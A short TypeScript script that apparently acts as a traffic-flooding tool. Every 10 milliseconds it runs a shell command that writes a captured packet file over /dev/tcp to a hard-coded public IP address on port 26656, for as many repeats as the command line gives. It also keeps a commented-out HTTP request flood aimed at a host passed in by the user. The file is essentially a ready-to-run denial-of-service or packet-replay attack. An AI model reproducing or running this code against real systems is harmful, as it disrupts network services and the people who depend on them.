import axios from 'axios';
import process from 'process';
const { exec } = require('child_process');

let errors = 0,
    success = 0,
    errorMessages: any[] = []

const worker = ( host: string, amount: string ) => {
    // Send requests with interval

    let requests = 0;
    let totalRequests = 0;

   setInterval( () => {
       if ( requests < Number( amount ) ) {
           requests ++;
           totalRequests ++;
           request();
       }
   }, 10 );

    setInterval( () => {



        // @ts-ignore
        //process.send({ total: totalRequests, errors: errors });
        //totalRequests = 0;

        //console.log( process.pid + `: Requests: ${ blue( totalRequests ) } Errors: ${ red( errors ) } Current: ${ requests }`)
    }, 1000 );

    const request = async () => {


        exec('cat peer-ack.pcap > /dev/tcp/135.181.16.249/26656', (err: any, stdout:any, stderr:any) => {
            if (err) {
                //some err occurred
                console.error(err)
            } else {
                // the *entire* stdout and stderr (buffered)
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
            }
        });

        // let isFailedRequest = false
        // const response = await axios.get(
        //     host
        // ).catch( ( err: any ) => {
        //     if( err ) {
        //         isFailedRequest = true
        //         errors++
        //     }
        // } );
        // if( response ) {
        //     isFailedRequest = false
        // }
        // requests --;
    }
}

worker( process.argv[2], process.argv[3] )
